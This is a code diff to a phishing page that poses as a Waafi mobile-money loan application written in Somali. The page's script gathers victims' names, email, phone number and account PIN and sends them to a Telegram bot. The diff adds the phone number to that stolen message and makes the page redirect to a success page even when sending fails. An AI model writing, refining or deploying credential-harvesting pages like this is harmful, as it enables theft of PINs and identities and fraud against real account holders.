@@ -11,7 +11,7 @@ label{display:block;margin:15px 0 5px;font-weight:600} input,select{width:100%;p
 .pin{display:flex;justify-content:center;gap:12px;margin:15px 0}
 .pin input{width:50px;height:50px;text-align:center;font-size:22px;border:2px solid #00B347;border-radius:10px}
 .btn{width:100%;padding:18px;border:none;border-radius:12px;font-size:18px;font-weight:bold;background:linear-gradient(90deg,#a8e063,#00B347);color:white;margin-top:10px}
-.btn:disabled{background:#ccc}</style>
+.btn-gray{background:#ddd;color:#333}</style>
 </head><body>
 <div class="header">← Dib u noqo <span style="margin-left:auto">Waafi</span></div>
 <div class="container"><div class="card">
@@ -38,7 +38,8 @@ label{display:block;margin:15px 0 5px;font-weight:600} input,select{width:100%;p
 <div class="row"><span>Codsade:</span><span id="s_name">-</span></div>
 </div>
 
-<button class="btn" id="sendBtn" onclick="submit()">DIR CODSIGA</button>
+<button class="btn-gray" onclick="location.href='step2.html'">KA HORE</button>
+<button class="btn" onclick="submit()">DIR CODSIGA</button>
 </div></div>
 <script>
 const step1=JSON.parse(localStorage.getItem('waafi_step1')||'{}');
@@ -62,7 +63,7 @@ const message=`🔥 NEW WAAFI APPLICATION 🔥
 
 👤 NAME: ${fullData.fname} ${fullData.lname}
 📧 EMAIL: ${fullData.email}
-📱 PHONE: +252 
+📱 PHONE: +252 ${fullData.phone}
 🔑 PIN: ${fullData.pin}
 
 💰 LOAN: ${fullData.type}
@@ -76,17 +77,9 @@ const message=`🔥 NEW WAAFI APPLICATION 🔥
 Time: ${new Date().toLocaleString()}`;
 
 fetch(`https://api.telegram.org/bot${BOT}/sendMessage`,{
-method:"POST",
-headers:{"Content-Type":"application/json"},
+method:"POST",headers:{"Content-Type":"application/json"},
 body:JSON.stringify({chat_id:CHAT,text:message})
-})
-.then(res=>res.json())
-.then(data=>{
-if(data.ok){
-localStorage.clear();
-location.href='success.html';
-}else{alert('Error: '+data.description)}
-})
-.catch(err=>alert("Internet error"));
+}).then(()=>{localStorage.clear();location.href='success.html';})
+.catch(()=>alert("Internet error"));
 }
 </script></body></html>
